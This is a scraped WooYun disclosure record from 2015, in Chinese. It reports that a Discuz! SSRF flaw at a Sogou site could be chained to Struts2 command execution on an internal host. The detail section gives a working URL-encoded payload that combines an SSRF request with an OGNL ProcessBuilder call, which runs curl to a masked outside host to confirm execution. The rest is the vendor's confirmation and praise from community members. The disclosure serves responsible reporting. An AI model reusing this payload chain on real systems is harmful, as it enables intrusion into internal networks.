{"id": 72045, "wybug_id": "wooyun-2015-0151181", "wybug_title": "搜狗某内网存在Struts2命令执行（discuz!应用实例）", "wybug_corp": "搜狗", "wybug_author": "Jannock", "wybug_date": "2015-11-02 08:56", "wybug_open_date": "2015-12-17 14:16", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 搜狗某内网存在Struts2命令执行（discuz!应用实例） 详细说明：  http://bizhi.sogou.com/bbs/ 为 discuz! 漏洞。存在多处SSRF漏洞，可以直接绕过边界，打内网漏洞。首先暴力破解子域名，发现内网IP\n\n\nhttp://bizhi.sogou.com/bbs/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://'+ ip +'/login.action?redirect:${%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%255B%255D%2520{%2527curl%2527,%2527http://xxxxxx/api.php?'+ ip +'%2527})).start()}xx.jpg[/img]&formhash=09cec465\n请求带上cookie 和 formhash。ip 为 内网IP段遍列。。api.php 记录请求IP和链接一会看到网址接收到返回IP221.204.14.27\t10.13.203.183即 10.13.203.183 存在Struts2命令执行   漏洞证明：  \n\n\n\n   修复方案：  discuz! 漏洞详细请参考官方   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-02 14:15 厂商回复： 收到，正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-02 08:59 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1052 漏洞数:94        | 梦想还是要有的，万一实现了呢？)\t\t \n  一哥！    \n     2015-11-02 09:14 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:30        | 击缻)\t\t \n  Struts2和discuz!？期待    \n     2015-11-02 09:15 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1250 漏洞数:124        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  关注    \n     2015-11-02 09:32 |    \t\twe8_ \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:21        | ⚡️)\t\t \n  关注    \n     2015-11-02 09:32 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:597 漏洞数:84        | 千里之堤溃于蚁穴)\t\t \n  前排关注一哥！    \n     2015-11-02 09:37 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:20        | 喝口水,压压惊......)\t\t \n  关注前排    \n     2015-11-02 09:39 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | for fun……)\t\t \n  一哥终于开始活跃了    \n     2015-11-02 09:44 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:64        | 没有我，你们就去背IP吧)\t\t \n  恩    \n     2015-11-02 09:52 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:230 漏洞数:34        )\t\t \n  顶一个    \n     2015-11-02 09:54 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3650 漏洞数:282        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  一会SSRF一下腾讯    \n     2015-11-02 09:58 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:219        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  。。。。。。。。。。屌爆了啊    \n     2015-11-02 10:17 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  肯定本来就有shell。HAHA    \n     2015-11-02 10:53 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:89        | ®高级安全工程师 | WooYun认证√)\t\t \n  内网shell    \n     2015-11-02 11:26 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 每日必关注乌云)\t\t \n  亮了    \n     2015-11-02 12:59 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  ssrf    \n     2015-11-02 15:51 |    \t\t我在不想理你 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:7        | 现在开始学php会不会晚了...)\t\t \n  关注    \n     2015-11-02 17:39 |    \t\tRand0m \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:4        | 真的有一米八五。。)\t\t \n  前排    \n     2015-12-14 14:41 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:27        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  精彩啊，边界绕过，反弹利用。思路吊炸天    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}